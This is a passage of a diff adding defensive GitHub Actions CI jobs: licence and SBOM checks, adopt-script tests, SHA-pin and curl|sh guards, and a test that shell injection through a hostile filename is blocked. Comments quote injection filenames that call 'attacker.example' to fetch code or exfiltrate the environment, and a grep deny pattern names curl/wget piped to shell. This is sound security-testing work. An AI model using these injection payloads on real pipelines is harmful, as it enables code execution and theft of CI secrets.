+          ./scripts/scan.sh --skip semgrep --skip gitleaks \
+            --sbom /tmp/deep/nested/sbom.cdx.json --no-fail
+          python3 - <<'PY'
+          import json, sys
+          d = json.load(open('/tmp/deep/nested/sbom.cdx.json'))
+          comps = d.get('components', [])
+          assert d.get('specVersion') == '1.6', d.get('specVersion')
+          assert len(comps) > 20, f'only {len(comps)} components — the SBOM is near-empty'
+          licensed = [c for c in comps if c.get('licenses')]
+          if len(licensed) < len(comps) // 2:
+              sys.exit(
+                  f'::error::only {len(licensed)}/{len(comps)} components carry licence '
+                  'data — the bare --licenses flag was dropped from the SBOM run'
+              )
+          print(f'OK: {len(comps)} components, {len(licensed)} with licences')
+          PY
+
+      - name: The licence gate must fire, and must be OFF by default
+        shell: bash
+        run: |
+          set -uo pipefail
+          rc=0
+          ./scripts/scan.sh --skip semgrep --skip gitleaks \
+            --licenses 'NoSuchLicense-1.0' >/tmp/gate.log 2>&1 || rc=$?
+          if [[ $rc -eq 0 ]]; then
+            tail -30 /tmp/gate.log
+            echo '::error::an impossible allowlist passed — the licence gate does not gate'
+            exit 1
+          fi
+          grep -q 'licenses   VIOLATIONS' /tmp/gate.log || {
+            tail -30 /tmp/gate.log
+            echo '::error::the failure was not attributed to the licence check'; exit 1; }
+
+          rc=0
+          ./scripts/scan.sh --skip semgrep --skip gitleaks >/tmp/nogate.log 2>&1 || rc=$?
+          # No allowlist means no licence line at all — not a passing one. An
+          # empty status would render as a blank cell in the standing report,
+          # which reads as "checked, clean".
+          if grep -q '^  licenses' /tmp/nogate.log; then
+            echo '::error::a licence line appeared with no allowlist given'; exit 1
+          fi
+          if [[ $rc -ne 0 ]]; then
+            tail -30 /tmp/nogate.log
+            # No licence line above, so this is osv finding a REAL vulnerability
+            # in our own dependencies. Correct to fail on; just not this test's
+            # subject, and the message should not send anyone to the wrong file.
+            echo '::error::osv-scanner found a vulnerability in this repo. Not a licence-gate regression — fix or bump the dependency.'
+            exit 1
+          fi
+          echo 'OK: licence gate fires on violation and stays off by default'
+
+  # The sample .editorconfig is a COPY of configs/ (editorconfig has no import),
+  # so it can drift from the thing it exists to test — and it had, by the time
+  # #24 was written. Cheap guard, catches it at the PR.
+  editorconfig-drift:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - name: Sample .editorconfigs must match configs/ verbatim
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          cat configs/editorconfig configs/dotnet/dotnet.editorconfig > /tmp/expected.editorconfig
+          for f in samples/dotnet/.editorconfig samples/dotnet-tests/.editorconfig samples/dotnet-clean/.editorconfig; do
+            diff -u /tmp/expected.editorconfig "$f" || {
+              echo "::error::$f has drifted from configs/ — regenerate it:"
+              echo "::error::  cat configs/editorconfig configs/dotnet/dotnet.editorconfig > $f"
+              exit 1
+            }
+          done
+          echo 'OK: both sample .editorconfigs match configs/'
+
+  # #11 — adopt.sh, proven end-to-end rather than by reading it. The assertion
+  # that matters is not "it copied some files", it is "a repo adopted by the
+  # script behaves exactly like the hand-configured sample" — in BOTH
+  # directions. An adoption that produces a gate which does not gate is worse
+  # than no adoption, because it looks green.
+  adopt:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6
+        with:
+          dotnet-version: '10.0.x'
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7
+        with:
+          python-version: '3.12'
+      - name: Exit codes and dry-run honesty
+        shell: bash
+        run: |
+          set -uo pipefail
+          mkdir -p /tmp/empty && echo hi > /tmp/empty/README.md
+          rc=0; ./scripts/adopt.sh /tmp/empty      >/dev/null 2>&1 || rc=$?
+          [[ $rc -eq 1 ]] || { echo "::error::no-language repo should exit 1, got $rc"; exit 1; }
+          rc=0; ./scripts/adopt.sh .               >/dev/null 2>&1 || rc=$?
+          [[ $rc -eq 3 ]] || { echo "::error::self-adopt should exit 3, got $rc"; exit 1; }
+          rc=0; ./scripts/adopt.sh /nope/nope      >/dev/null 2>&1 || rc=$?
+          [[ $rc -eq 3 ]] || { echo "::error::missing dir should exit 3, got $rc"; exit 1; }
+          # A dry run that writes anything is worse than no dry run at all.
+          mkdir -p /tmp/dry && echo '{"name":"d"}' > /tmp/dry/package.json
+          ./scripts/adopt.sh /tmp/dry --dry-run >/dev/null 2>&1
+          if [[ -e /tmp/dry/eslint.base.mjs || -e /tmp/dry/.editorconfig ]]; then
+            echo '::error::--dry-run wrote files'; exit 1
+          fi
+          echo 'OK: exit codes correct, --dry-run wrote nothing'
+      - name: Adopted repo must BUILD CLEAN on the clean fixture
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          mkdir -p /tmp/consumer-clean
+          cp samples/dotnet-clean/Program.cs /tmp/consumer-clean/
+          cat > /tmp/consumer-clean/Consumer.csproj <<'CSPROJ'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <OutputType>Exe</OutputType>
+              <TargetFramework>net10.0</TargetFramework>
+              <RootNamespace>Maximalcode.Sample.Clean</RootNamespace>
+            </PropertyGroup>
+          </Project>
+          CSPROJ
+          ./scripts/adopt.sh /tmp/consumer-clean --no-workflow
+          cd /tmp/consumer-clean
+          rc=0; out=$(dotnet build --nologo --no-incremental 2>&1) || rc=$?
+          echo "$out"
+          [[ $rc -eq 0 ]] || { echo '::error::adopted repo failed on clean code'; exit 1; }
+          if ! grep -qE '^ +0 Error\(s\)$' <<<"$out" || ! grep -qE '^ +0 Warning\(s\)$' <<<"$out"; then
+            echo '::error::expected 0/0 from an adopted clean repo'
+            exit 1
+          fi
+          echo 'OK: adopted repo builds clean code with 0/0'
+      - name: Adopted repo must GATE on the bad fixture, identically
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          mkdir -p /tmp/consumer-bad
+          cp samples/dotnet/Program.cs /tmp/consumer-bad/
+          cat > /tmp/consumer-bad/Consumer.csproj <<'CSPROJ'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <OutputType>Exe</OutputType>
+              <TargetFramework>net10.0</TargetFramework>
+              <RootNamespace>Maximalcode.Sample</RootNamespace>
+            </PropertyGroup>
+          </Project>
+          CSPROJ
+          ./scripts/adopt.sh /tmp/consumer-bad --no-workflow
+          cd /tmp/consumer-bad
+          rc=0; out=$(dotnet build --nologo --no-incremental 2>&1) || rc=$?
+          echo "$out"
+          [[ $rc -ne 0 ]] || { echo '::error::adopted repo did NOT gate on the bad fixture'; exit 1; }
+          grep -qE '^ +13 Error\(s\)$' <<<"$out" || {
+            echo '::error::adopted repo gave a different count than samples/dotnet (13)'; exit 1; }
+          echo 'OK: adopted repo reproduces the sample exactly — 13 errors'
+      - name: Refuses to write a Directory.Build.props MSBuild would ignore
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          # MSBuild stops at the FIRST Directory.Build.props walking up from a
+          # project. Writing one above an existing one produces a file that is
+          # never read: the gate looks adopted and analyses nothing. That is
+          # the worst failure mode a quality tool has, so it must be loud.
+          mkdir -p /tmp/shadowed/nested
+          echo '<Project Sdk="Microsoft.NET.Sdk"></Project>' > /tmp/shadowed/nested/P.csproj
+          echo '<Project></Project>' > /tmp/shadowed/nested/Directory.Build.props
+          out=$(./scripts/adopt.sh /tmp/shadowed --no-workflow 2>&1)
+          echo "$out"
+          grep -q 'SILENTLY IGNORED' <<<"$out" || {
+            echo '::error::adopt.sh did not warn about a shadowing Directory.Build.props'; exit 1; }
+          if [[ -e /tmp/shadowed/Directory.Build.props ]]; then
+            echo '::error::adopt.sh wrote a props file that MSBuild would ignore'; exit 1
+          fi
+          echo 'OK: refused to write a shadowed Directory.Build.props'
+
+      # Ruff's `per-file-ignores` and `select` REPLACE the extended base rather
+      # than merging, silently. A stub emitting the plain forms would strip the
+      # baseline's assert-in-tests waiver and fail every adopting project's test
+      # suite on S101 — found by running it, not by reading the docs. The stub
+      # emits the extend- forms; this is what stops that regressing.
+      - name: Adopted Python repo must gate identically, and keep inherited waivers
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          pip install -r samples/python/requirements-dev.txt >/dev/null
+          mkdir -p /tmp/consumer-py/src /tmp/consumer-py/tests
+          printf '[project]\nname = "demo"\nversion = "0.1.0"\n' > /tmp/consumer-py/pyproject.toml
+          touch /tmp/consumer-py/uv.lock
+          cp samples/python/src/bad.py /tmp/consumer-py/src/
+          printf 'def test_x() -> None:\n    assert True\n' > /tmp/consumer-py/tests/test_x.py
+          ./scripts/adopt.sh /tmp/consumer-py --no-workflow >/dev/null
+
+          grep -q 'extend-per-file-ignores' /tmp/consumer-py/ruff.toml || {
+            echo '::error::stub ruff.toml uses the REPLACING form — inherited waivers will be dropped'
+            exit 1
+          }
+
+          rc=0; out=$(ruff check --output-format=concise /tmp/consumer-py 2>&1) || rc=$?
+          echo "$out"
+          [[ $rc -ne 0 ]] || { echo '::error::adopted Python repo did not gate'; exit 1; }
+          # Same 14 as the hand-configured sample: adoption must not change the
+          # verdict, in either direction.
+          grep -q 'Found 14 errors' <<<"$out" || {
+            echo '::error::adopted repo gave a different count than samples/python — adoption is not equivalent'
+            exit 1
+          }
+          if grep -q 'tests/test_x.py.*S101' <<<"$out"; then
+            echo '::error::assert-in-tests waiver was lost through extend — the stub clobbered it'
+            exit 1
+          fi
+          echo 'OK: adopted Python repo gates at 14/14 and keeps inherited waivers'
+
+      - name: Idempotent, and never clobbers
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          before=$(sha256sum /tmp/consumer-bad/Directory.Build.props | cut -d' ' -f1)
+          ./scripts/adopt.sh /tmp/consumer-bad --no-workflow > /tmp/rerun.log 2>&1
+          after=$(sha256sum /tmp/consumer-bad/Directory.Build.props | cut -d' ' -f1)
+          [[ "$before" == "$after" ]] || { echo '::error::re-run overwrote an existing file'; exit 1; }
+          # The C# editorconfig section must not be appended twice.
+          n=$(grep -c 'maxi-quality — C# analyzer severities' /tmp/consumer-bad/.editorconfig)
+          [[ "$n" -eq 1 ]] || { echo "::error::C# editorconfig section appended $n times"; exit 1; }
+          grep -q 'skip' /tmp/rerun.log || { echo '::error::re-run did not report skips'; exit 1; }
+          echo 'OK: re-run is idempotent and non-destructive'
+
+  # #13 — Semgrep is pinned in two places: the layer2 action's input default and
+  # the layer2-counts job below. If they drift, CI asserts 32 findings against a
+  # Semgrep that consumers never run, and the samples quietly stop meaning what
+  # they claim. Offline on PRs; the weekly `pins` workflow does the upstream half.
+  version-pins:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - name: Pinned tool versions must be internally consistent
+        shell: bash
+        run: ./scripts/check-pins.sh --offline
+
+  # quality.yml is CONSUMER-FACING and nothing else here executes it — ci.yml is
+  # the self-test, quality.yml is what other repos call. So a change to it (an
+  # action major bump, a renamed input) can go green on every job above and
+  # still be broken for every consumer.
+  #
+  # actionlint is not a full substitute for the acceptance test, but it catches
+  # the structural half for free: invalid syntax, bad `uses:` refs, undefined
+  # inputs, shell bugs inside `run:` blocks.
+  workflow-lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - name: Lint every workflow, including the consumer-facing one
+        shell: bash
+        env:
+          ACTIONLINT_VERSION: '1.7.12'
+          # From actionlint_<version>_checksums.txt in the release. Verifying it
+          # is the difference between "we downloaded a binary" and "we
+          # downloaded THAT binary".
+          ACTIONLINT_SHA256: '8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8'
+        run: |
+          set -Eeuo pipefail
+          # Was: bash <(curl .../actionlint/main/scripts/download-actionlint.bash)
+          # — unpinned code from a third party's moving branch, executed in CI.
+          # Lower stakes than the same shape in quality.yml (this token is
+          # read-only and PRs get no secrets) but it is the pattern this repo
+          # exists to argue against, and the SHA-pin guard below now rejects it.
+          curl -sSfL -o /tmp/actionlint.tgz \
+            "https://github.com/rhysd/actionlint/releases/download/v${ACTIONLINT_VERSION}/actionlint_${ACTIONLINT_VERSION}_linux_amd64.tar.gz"
+          echo "${ACTIONLINT_SHA256}  /tmp/actionlint.tgz" | sha256sum -c -
+          tar -xzf /tmp/actionlint.tgz -C /tmp actionlint
+          /tmp/actionlint -color -verbose
+          echo 'OK: all workflows lint clean'
+
+      # Third-party actions must be pinned to a full commit SHA, never a tag.
+      # A tag is mutable: whoever controls it can point it at new code, and that
+      # code then runs in every consumer's CI with their GITHUB_TOKEN. This is
+      # the supply-chain hole that `pins.yml` already closes for the scanner
+      # binaries; actions were simply never covered.
+      #
+      # `maximalcode/*@v1` is EXEMPT and must stay so: our own moving tag is how
+      # consumers pick up fixes without editing a file, it is our repo to move,
+      # and it only moves after this CI is green (release-tag.yml).
+      - name: Third-party actions must be SHA-pinned
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          bad=$(grep -rhoE 'uses: [A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+@[A-Za-z0-9._-]+' \
+                  .github/workflows/ actions/ \
+                | grep -vE '@[0-9a-f]{40}' \
+                | grep -vE '^uses: maximalcode/' \
+                | sort -u || true)
+          if [[ -n "$bad" ]]; then
+            echo '::error::these actions are pinned to a MUTABLE tag — use the full commit SHA:'
+            echo "$bad"
+            echo 'Resolve with: gh api repos/OWNER/REPO/git/ref/tags/TAG --jq .object.sha'
+            echo 'Keep the tag as a trailing comment so Dependabot can still bump it.'
+            exit 1
+          fi
+          echo 'OK: every third-party action is pinned to a commit SHA'
+
+      # The hole the check above left open for months: it matches `uses:` lines,
+      # and a pipe is not a `uses:` line. So quality.yml could — and did — carry
+      #
+      #     curl -LsSf https://astral.sh/uv/install.sh | sh
+      #
+      # inside the workflow that runs in EVERY consumer's CI with THEIR token,
+      # while this job reported "every third-party action is pinned". A guard
+      # that is satisfied while the thing it guards against is present in the
+      # same file is worse than no guard, because it is quoted as evidence.
+      #
+      # Downloading is fine. Downloading and EXECUTING without a pin and a
+      # checksum is not.
+      - name: No unpinned remote code execution
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          # curl|sh, wget|bash, and the bash <(curl ...) process-substitution
+          # form, which reads differently but does exactly the same thing.
+          #
+          # The second grep drops COMMENT lines. Both YAML and shell comments
+          # start with #, and this file documents the very patterns it bans —
+          # without this, the guard fails on its own rationale, and the fix
+          # someone reaches for is deleting the explanation.
+          bad=$(grep -rnE \
+                  '(curl|wget)[^|]*\|[[:space:]]*(sudo[[:space:]]+)?(ba)?sh|<\([[:space:]]*(curl|wget)' \
+                  .github/workflows/ actions/ \
+                | grep -vE '^[^:]+:[0-9]+:[[:space:]]*#' || true)
+          if [[ -n "$bad" ]]; then
+            echo '::error::remote code is fetched and executed without a version pin and a checksum:'
+            echo "$bad"
+            echo 'Use a SHA-pinned action, or download a pinned release and verify it with sha256sum -c.'
+            exit 1
+          fi
+          echo 'OK: no unpinned remote code execution in any workflow or action'
+
+      # Composite actions reach the baseline's scripts through
+      # ${GITHUB_ACTION_PATH}/../../scripts/... — that is the whole reason they
+      # are composite actions rather than a checkout of this private repo (see
+      # actions/report-issue). It also means moving or renaming a script breaks
+      # every consumer at RUNTIME, in a workflow nothing here executes, with a
+      # "No such file or directory" that points at a path on someone else's
+      # runner. actionlint does not look inside the string.
+      - name: Every GITHUB_ACTION_PATH reference must resolve
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          missing=0
+          checked=0
+          while IFS=: read -r file ref; do
+            # ${GITHUB_ACTION_PATH} is the directory holding that action.yml, so
+            # resolve each reference relative to ITS OWN action — not to some
+            # other one that happens to sit at the same depth.
+            rel="${ref#*GITHUB_ACTION_PATH\}}"
+            path="${file%/*}/${rel#/}"
+            checked=$((checked + 1))
+            if [[ ! -e "$path" ]]; then
+              echo "::error file=$file::unresolvable reference \${GITHUB_ACTION_PATH}$rel (looked for $path)"
+              missing=1
+            fi
+          done < <(grep -roE '\$\{GITHUB_ACTION_PATH\}[^"'"'"' ]*' actions/ | sort -u)
+          [[ "$checked" -gt 0 ]] || {
+            echo '::error::found no GITHUB_ACTION_PATH references at all — this guard stopped guarding'
+            exit 1; }
+          [[ "$missing" -eq 0 ]] || exit 1
+          echo "OK: all $checked composite-action script references resolve"
+
+      # actionlint lints WORKFLOWS. It does not read actions/*/action.yml at
+      # all — so the composite actions, which are the part every consumer
+      # actually executes, had no shell linting whatsoever. The report action
+      # shipped broken through exactly that gap.
+      #
+      # Extract each bash `run:` body and shellcheck it, with `${{ }}` replaced
+      # by a variable reference so the expression syntax does not confuse the
+      # parser (substituting a literal instead makes every `[[ -n "..." ]]` look
+      # constant, which is noise, not signal).
+      # `${{ }}` inside a `run:` body is substituted into the script TEXT before
+      # bash parses it, so a value carrying a quote stops being a value and
+      # becomes code. Inside `env:` it is passed as data.
+      #
+      # THIS CHECK ORIGINALLY SCANNED ONLY actions/, AND THAT GAP WAS THE BUG.
+      # The most dangerous instance of the exact banned pattern was one
+      # directory up, in the consumer-facing workflow:
+      #
+      #     - run: dotnet build "${{ matrix.target }}"
+      #
+      # `matrix.target` is a FILENAME globbed out of the consumer's own tree —
+      # i.e. whatever a contributor put in a pull request. A file named
+      # `a";curl -sL https://attacker.example/x|sh;".csproj` closed the quoted
+      # argument and ran the rest as shell, in the CONSUMER's CI with the
+      # consumer's token. Found in the second security review, after the first
+      # one added this check and scoped it too narrowly.
+      #
+      # It now covers workflows AND actions, with NO allowlist. Values that are
+      # provably safe today (a run outcome, a GitHub-generated SHA) still go
+      # through env:, because an exception list is where the next real one hides.
+      - name: No expression interpolated into any shell body, anywhere
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          # Runner images usually already have PyYAML; PEP 668 marks the system
+          # Python externally-managed on newer Ubuntu, so a bare `pip install`
+          # can hard-fail. Try in order, then assert rather than continue with a
+          # guard that would silently extract nothing.
+          python3 -c 'import yaml' 2>/dev/null \
+            || python3 -m pip install --quiet pyyaml 2>/dev/null \
+            || python3 -m pip install --quiet --break-system-packages pyyaml
+          python3 -c 'import yaml'
+
+          rm -rf /tmp/blocks && mkdir -p /tmp/blocks
+          python3 - <<'PY'
+          import pathlib, re, sys, yaml
+
+          EXPR = re.compile(r'\$\{\{[^}]*\}\}')
+          out = pathlib.Path('/tmp/blocks')
+          n = 0
+          bad = []
+
+          def steps_of(doc):
+              """Every run: step, from a composite action OR a workflow."""
+              yield from doc.get('runs', {}).get('steps', [])
+              for job in (doc.get('jobs') or {}).values():
+                  # A `uses:` job (reusable-workflow call) has no steps.
+                  yield from (job or {}).get('steps', []) or []
+
+          targets = sorted(pathlib.Path('actions').glob('*/action.yml')) \
+                  + sorted(pathlib.Path('.github/workflows').glob('*.yml'))
+          for p in targets:
+              doc = yaml.safe_load(p.read_text())
+              for i, step in enumerate(steps_of(doc)):
+                  body = step.get('run')
+                  if body is None:
+                      continue
+                  bad += [f'{p} step {i}: {m}' for m in EXPR.findall(body)]
+                  # Only bash blocks get shellchecked. A workflow step without
+                  # an explicit `shell:` still defaults to bash on ubuntu, so
+                  # absence is treated as bash rather than skipped — skipping is
+                  # how a step avoids review by omitting one line.
+                  if step.get('shell', 'bash') != 'bash':
+                      continue
+                  # Substitute a VARIABLE reference, not a literal: a literal
+                  # makes every `[[ -n "..." ]]` look constant to shellcheck,
+                  # which is noise rather than signal.
+                  safe = p.as_posix().replace('/', '--').replace('.', '_')
+                  (out / f'{safe}--step{i}.sh').write_text(
+                      '#!/usr/bin/env bash\n' + EXPR.sub('${GHA_EXPR}', body))
+                  n += 1
+          for b in bad:
+              print('::error::expression interpolated into a shell body — '
+                    f'pass it through env: instead — {b}')
+          if n == 0:
+              sys.exit('::error::extracted 0 shell blocks — this guard stopped guarding')
+          print(f'extracted {n} shell blocks from workflows and composite actions')
+          sys.exit(1 if bad else 0)
+          PY
+          # SC2154 off: RUNNER_TEMP, GITHUB_ACTION_PATH and friends are set by
+          # the runner, and the GHA_EXPR placeholder is assigned by definition.
+          shellcheck -s bash -e SC2154 /tmp/blocks/*.sh
+          echo 'OK: every workflow and composite-action shell block is shellcheck-clean and passes inputs via env:'
+
+  layer2:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+        with:
+          fetch-depth: 0
+      # Exercises the REAL delivery vehicle (actions/layer2), not a rebuild of
+      # its steps — if the composite action breaks, this job breaks.
+      - uses: ./actions/layer2
+        id: scan
+        continue-on-error: true
+      - name: Scan must have failed with 32 findings across all 19 rule ids
+        shell: bash
+        env:
+          OUTCOME: ${{ steps.scan.outcome }}
+        run: |
+          set -Eeuo pipefail
+          if [[ "$OUTCOME" != 'failure' ]]; then
+            echo '::error::Layer 2 scan passed on the bait samples — the ruleset regressed'
+            exit 1
+          fi
+          echo 'OK: Layer 2 rejected the samples (composite action path works)'
+
+  # A consumer's FILENAMES reach quality.yml's matrix, and a matrix value that
+  # is interpolated into a run body is code. This job proves the safe form is
+  # actually safe, and — the half that matters — that the hostile fixture is
+  # genuinely hostile rather than inert.
+  #
+  # The static guard in workflow-lint catches the pattern. This catches the
+  # BEHAVIOUR, so the two fail for different reasons and neither can quietly
+  # become a no-op.
+  matrix-injection:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - name: A hostile filename must not become shell
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          ROOT=$PWD
+          R=/tmp/hostile; rm -rf "$R"; mkdir -p "$R"; cd "$R"
+
+          # git permits quotes and semicolons in tracked paths, so this is a file
+          # a contributor can add in a pull request to a consuming repo.
+          #
+          # NOTE THE ABSENCE OF SLASHES. A filename cannot contain '/', which
+          # rules out the obvious `curl https://host/path | sh` payload — the
+          # first version of this test used one and simply failed to create the
+          # file. It is not a mitigation: `env|curl attacker.example -d@-` needs
+          # no slash and exfiltrates the whole environment. The marker below is
+          # the same shape, minus the network.
+          touch 'a";touch pwned;".csproj'
+
+          # Exactly the detect step's pipeline from quality.yml.
+          targets=$(find . -name node_modules -prune -o -type f -name '*.csproj' -print \
+                    | sed 's|^\./||' | jq -R . | jq -sc .)
+          echo "detected: $targets"
+          T=$(jq -r '.[0]' <<<"$targets")
+
+          # 1. THE FIXTURE MUST BE DANGEROUS. `eval` reproduces what GitHub's
+          #    expression substitution does — splice into the script text, then
+          #    let bash parse it. If this does NOT create the marker, the
+          #    filename is harmless and the assertion below would pass against a
+          #    broken guard forever.
+          #
+          #    (The literal expression syntax is deliberately NOT written out
+          #    anywhere in this block. Inside a run: body it is parsed by
+          #    actionlint and matched by our own guard — and unlike the
+          #    fetch-and-execute check, this guard must NOT get a comment
+          #    exemption: substitution happens before bash sees the text, so a
+          #    value containing a newline escapes a shell comment into code.)
+          rm -f pwned
+          eval "printf 'building %s\n' \"$T\"" >/dev/null 2>&1 || true
+          if [[ ! -f pwned ]]; then
+            echo '::error::the hostile filename did not inject even under eval — the fixture is inert and proves nothing'
+            exit 1
+          fi
+          echo 'OK: fixture is genuinely dangerous (injected under textual substitution)'
+
+          # 2. THE SAFE FORM MUST HOLD. env: passes a value, so bash never
+          #    parses the filename as syntax.
+          rm -f pwned
+          TARGET="$T" bash -c 'printf "building %s\n" "$TARGET"' >/dev/null
+          if [[ -f pwned ]]; then
+            echo '::error::the env: form executed the filename — passing through env no longer protects the matrix value'
+            exit 1
+          fi
+          echo 'OK: env: form treats the same filename as data'
+
+          cd "$ROOT"
+          # 3. And quality.yml must actually USE the safe form for it.
+          # `.` stands in for the `$` in both patterns. A literal $ inside
+          # single quotes trips SC2016, and this repo is linted by the same
+          # actionlint it ships — same dodge as the backticks in the report test.
+          if ! grep -qE 'TARGET: .\{\{ matrix\.target \}\}' .github/workflows/quality.yml; then
+            echo '::error::quality.yml no longer passes matrix.target through env:'
+            exit 1
+          fi
+          grep -qE 'dotnet build ".TARGET"' .github/workflows/quality.yml || {
+            echo '::error::the dotnet build step no longer uses the env variable'; exit 1; }
+          echo 'OK: quality.yml passes matrix.target through env:'
+
+  # The counts, asserted precisely — semgrep JSON, no fragile CLI-output greps.
+  layer2-counts:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - name: Every expected finding fires, and every defined rule id is alive
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          pipx install semgrep==1.172.0
+          semgrep --config semgrep --json --metrics=off --disable-version-check \
+            > /tmp/results.json || true
+
+          # The set assertion. This is what a bare total could not do: a rule
+          # branch can be deleted and another finding appear in its place with
+          # the total unmoved, which is exactly how the single-quote SQL gap
+          # stayed green at 28/19 (STATUS §4). check-expected.py also refuses a
+          # run whose `.errors` is non-empty — a semgrep that failed to load a
+          # rule reports `results: []`, which is otherwise indistinguishable
+          # from a clean tree.
+          python3 scripts/check-expected.py --tool semgrep \
+            --input /tmp/results.json --expected samples/expected/semgrep.json
+
+          # The dead-rule guard, kept: it asks a different question — not "did
+          # the expected findings fire?" but "does every rule we ship fire at
+          # all?". A new rule with no fixture is caught here and nowhere else.
+          # The pattern tolerates any leading indentation; the old `'^  - id:'`
+          # counted only ids indented exactly two spaces.
+          fired=$(jq -r '.results[].check_id' /tmp/results.json | sort -u | wc -l)
+          defined=$(grep -rhE '^[[:space:]]*- id:' semgrep/ | wc -l)
+          echo "fired_ids=$fired defined_ids=$defined"
+          [[ "$fired" -eq "$defined" ]] || {
+            echo "::error::$defined rule ids defined but only $fired fire — a rule has no fixture"
+            exit 1; }
+          echo "OK: expected findings match, all $defined defined rule ids fire"
